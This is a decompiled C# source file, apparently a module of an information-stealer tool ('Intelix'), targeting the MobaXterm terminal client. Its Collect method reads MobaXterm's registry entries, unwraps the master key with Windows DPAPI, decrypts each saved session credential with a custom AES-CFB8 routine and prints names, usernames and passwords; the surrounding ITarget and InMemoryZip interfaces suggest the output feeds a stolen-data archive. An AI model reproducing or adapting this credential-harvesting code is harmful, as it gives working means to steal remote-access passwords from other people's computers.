using System;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Text;
using Intelix.Helper.Data;
using Microsoft.Win32;

namespace Intelix.Targets.Applications
{
	// Token: 0x02000048 RID: 72
	public class MobaXterm : ITarget
	{
		// Token: 0x060000EB RID: 235 RVA: 0x0000DA94 File Offset: 0x0000BC94
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string entropy = (string)Registry.CurrentUser.OpenSubKey("SOFTWARE\\Mobatek\\MobaXterm").GetValue("SessionP");
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Mobatek\\MobaXterm\\m");
			string name = registryKey.GetValueNames()[0];
			string base64Value = (string)registryKey.GetValue(name);
			byte[] key = this.DecryptMobaXtermMasterKey(base64Value, entropy);
			RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Mobatek\\MobaXterm\\C");
			string[] valueNames = registryKey2.GetValueNames();
			foreach (string text in valueNames)
			{
				string[] array2 = ((string)registryKey2.GetValue(text)).Split(new char[]
				{
					':'
				}, 2);
				string str = array2[0];
				string ciphertextBase = array2[1];
				string str2 = this.DecryptCredential(key, ciphertextBase);
				Console.WriteLine("[*] Name:     " + text);
				Console.WriteLine("[*] Username: " + str);
				Console.WriteLine("[*] Password: " + str2);
				Console.WriteLine();
			}
		}

		// Token: 0x060000EC RID: 236 RVA: 0x0000DBA8 File Offset: 0x0000BDA8
		private byte[] DecryptMobaXtermMasterKey(string base64Value, string Entropy)
		{
			byte[] array = new byte[]
			{
				1,
				0,
				0,
				0,
				208,
				140,
				157,
				223,
				1,
				21,
				209,
				17,
				140,
				122,
				0,
				192,
				79,
				194,
				151,
				235
			};
			byte[] array2 = Convert.FromBase64String(base64Value);
			byte[] array3 = new byte[array.Length + array2.Length];
			Buffer.BlockCopy(array, 0, array3, 0, array.Length);
			Buffer.BlockCopy(array2, 0, array3, array.Length, array2.Length);
			byte[] bytes = Encoding.UTF8.GetBytes(Entropy);
			return ProtectedData.Unprotect(array3, bytes, DataProtectionScope.CurrentUser);
		}

		// Token: 0x060000ED RID: 237 RVA: 0x0000DC14 File Offset: 0x0000BE14
		private string DecryptCredential(byte[] key, string ciphertextBase64)
		{
			byte[] array = this.LenientBase64Decode(ciphertextBase64);
			byte[] inputBuffer = new byte[16];
			byte[] array2 = new byte[16];
			using (Aes aes = Aes.Create())
			{
				aes.Mode = CipherMode.ECB;
				aes.Padding = PaddingMode.None;
				aes.Key = key;
				using (ICryptoTransform cryptoTransform = aes.CreateEncryptor())
				{
					cryptoTransform.TransformBlock(inputBuffer, 0, 16, array2, 0);
				}
			}
			byte[] array3 = (byte[])array2.Clone();
			byte[] array4 = new byte[array.Length];
			using (Aes aes2 = Aes.Create())
			{
				aes2.Mode = CipherMode.ECB;
				aes2.Padding = PaddingMode.None;
				aes2.Key = key;
				using (ICryptoTransform cryptoTransform2 = aes2.CreateEncryptor())
				{
					byte[] array5 = new byte[16];
					for (int i = 0; i < array.Length; i++)
					{
						cryptoTransform2.TransformBlock(array3, 0, 16, array5, 0);
						array4[i] = (byte)(array[i] ^ array5[0]);
						Buffer.BlockCopy(array3, 1, array3, 0, 15);
						array3[15] = array[i];
					}
				}
			}
			return Encoding.Default.GetString(array4).TrimEnd(new char[1]);
		}

		// Token: 0x060000EE RID: 238 RVA: 0x0000DD9C File Offset: 0x0000BF9C
		private byte[] LenientBase64Decode(string s)
		{
			StringBuilder stringBuilder = new StringBuilder(s.Length);
			int i = 0;
			while (i < s.Length)
			{
				char c = s[i];
				switch (c)
				{
				case '-':
				case '_':
					stringBuilder.Append((c == '-') ? '+' : '/');
					break;
				case '.':
				case '/':
				case '0':
				case '1':
				case '2':
				case '3':
				case '4':
				case '5':
				case '6':
				case '7':
				case '8':
				case '9':
				case ':':
				case ';':
				case '<':
				case '=':
				case '>':
				case '?':
				case '@':
				case '[':
				case '\\':
				case ']':
				case '^':
					goto IL_11A;
				case 'A':
				case 'B':
				case 'C':
				case 'D':
				case 'E':
				case 'F':
				case 'G':
				case 'H':
				case 'I':
				case 'J':
				case 'K':
				case 'L':
				case 'M':
				case 'N':
				case 'O':
				case 'P':
				case 'Q':
				case 'R':
				case 'S':
				case 'T':
				case 'U':
				case 'V':
				case 'W':
				case 'X':
				case 'Y':
				case 'Z':
					goto IL_157;
				default:
					goto IL_11A;
				}
				IL_161:
				i++;
				continue;
				IL_11A:
				bool flag = (c < 'a' || c > 'z') && (c < '0' || c > '9') && c != '+' && c != '/' && c != '=';
				if (flag)
				{
					goto IL_161;
				}
				IL_157:
				stringBuilder.Append(c);
				goto IL_161;
			}
			string text = stringBuilder.ToString();
			int num = text.Length % 4;
			bool flag2 = num != 0;
			if (flag2)
			{
				text += new string('=', 4 - num);
			}
			List<byte> list = new List<byte>(text.Length * 3 / 4);
			for (int j = 0; j < text.Length; j += 4)
			{
				int[] array = new int[4];
				for (int k = 0; k < 4; k++)
				{
					char c2 = text[j + k];
					bool flag3 = c2 == '=';
					if (flag3)
					{
						array[k] = -1;
					}
					else
					{
						array[k] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".IndexOf(c2);
					}
				}
				int num2 = array[0];
				int num3 = array[1];
				int num4 = array[2];
				int num5 = array[3];
				byte item = (byte)(num2 << 2 | (num3 & 48) >> 4);
				list.Add(item);
				bool flag4 = num4 != -1;
				if (flag4)
				{
					byte item2 = (byte)((num3 & 15) << 4 | (num4 & 60) >> 2);
					list.Add(item2);
				}
				bool flag5 = num5 != -1;
				if (flag5)
				{
					byte item3 = (byte)((num4 & 3) << 6 | num5);
					list.Add(item3);
				}
			}
			return list.ToArray();
		}
	}
}
